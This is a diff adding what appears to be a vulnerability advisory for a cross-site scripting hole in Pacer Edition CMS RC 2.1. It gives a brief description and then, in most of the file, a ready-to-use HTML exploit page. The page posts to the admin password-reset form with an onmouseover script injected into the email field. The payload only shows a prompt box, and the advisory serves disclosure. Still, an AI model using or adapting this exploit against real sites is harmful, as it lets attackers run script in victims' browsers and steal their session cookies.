@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/48215/info
+
+
+The Pacer Edition CMS is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+The Pacer Edition CMS RC 2.1 is vulnerable; prior versions may also be affected. 
+
+<html>
+<title>Pacer Edition CMS 2.1 Remote XSS POST Injection Vulnerability</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">function xss1(){document.forms["xss"].submit();}</script>
+<form action="http://www.example.com/admin/login/forgot/index.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="url" value="1" />
+<input type="hidden" name="email" value=&#039;%F6"+onmouseover=prompt(31337)&#039; />
+<input type="hidden" name="button" value="Send%20Details" />
+</form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit!<h3></center></font></b></a>
+</body>
+</html>
